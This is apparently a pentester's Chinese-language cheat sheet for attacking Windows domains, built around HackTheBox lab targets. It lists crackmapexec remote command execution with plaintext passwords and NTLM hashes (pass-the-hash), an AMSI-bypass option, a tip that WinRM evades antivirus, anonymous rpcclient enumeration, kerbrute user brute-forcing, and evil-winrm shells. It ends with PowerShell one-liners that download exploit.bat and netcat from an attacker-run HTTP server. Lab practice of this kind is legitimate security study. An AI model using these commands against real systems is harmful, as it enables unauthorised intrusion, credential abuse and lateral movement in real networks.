# 域渗透工具

## crackmapexec

```
-x 通过cmd.exe 执行命令
-X 通过cmd.exe 调用执行powershell命令
crackmapexec smb 192.168.216.144 -u 'administrator' -p 'pass1234!' -x 'whoami'
或者使用ntlm hash
crackmapexec smb 192.168.216.144 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:ff1a0a31d936bc8bf8b1ffc5b244b356' -x 'whoami'
默认情况下会自动选择登录域，-d可以指定域登录，-x 要执行的命令
CME将按以下顺序执行命令
1.wmiexec：通过WMI执行命令
2.atexe：通过Windows任务调度程序调度任务来执行命令
3.smbexec：通过创建和运行服务来执行命令

-X '$PSVersionTable' 使用查看powershell 版本环境命令 ，--amsi-bypass /path/payload 执行powershell
```

通过winrm执行命令很多情况下可以绕过一些杀软的拦截

```
crackmapexec wimri 192.168.216.144 -u 'administrator' -p 'pass1234!' -x 'whoami'
```

## rpcclient

```
 rpcclient -U bhult 10.10.10.193 --password=Fabricorp02@
```

```
# RPC 客户端
rpcclient -U "" -N 10.129.14.128
-U ""：空用户名，表示匿名登录。
-N：无需密码。
# 一些特殊命令，获取相关信息
srvinfo  # 服务器信息
enumdomains  # 枚举部署在网络中的所有域
querydominfo  # 提供已部署域的域、服务器和用户信息
netshareenumall  #     枚举所有可用的共享
netsharegetinfo <share>  # 提供有关特定共享的信息
enumdomgroups #枚举域组
enumdomusers  # 枚举所有域用户
queryuser <RID>  # 提供有关特定用户的信息
querygroup <RID>  # 提供有关特定组的信息
enumprivs #枚举权限
getdompwinfo #获取域密码信息
getusrdompwinfo 0x1f4 #获取用户域密码信息
querydispinfo #扩展有关用户及其描述的信息量
enumprints #枚举打印机
```



# 端口

## 53端口

## 88端口

**Kerberos 的**运行原则是验证用户身份，但不直接管理用户对资源的访问。这是一个重要的区别，因为它强调了该协议在安全框架中的作用。

使用[ropnop/kerbrute](https://github.com/ropnop/kerbrute)工具可以爆破域中的用户，账号密码

```
./kerbrute userenum --dc 10.10.10.193 -d FABRICORP.LOCAL  ../hackthebox/fuse-windows/id.list 
```

## 5985/5986

[winrm](https://github.com/Hackplayers/evil-winrm.git)提供一个linux连接winrm的shell

安装方法:

```
gem install evil-winrm
```

```
evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'
```

# 文件上传/下载

```
 iwr http://10.10.14.52:8000/exploit.bat -Outfile C:\Temp\exploit.bat
```

```
powershell wget http://10.10.16.3:8000/nc64.exe -outfile nc.exe
```

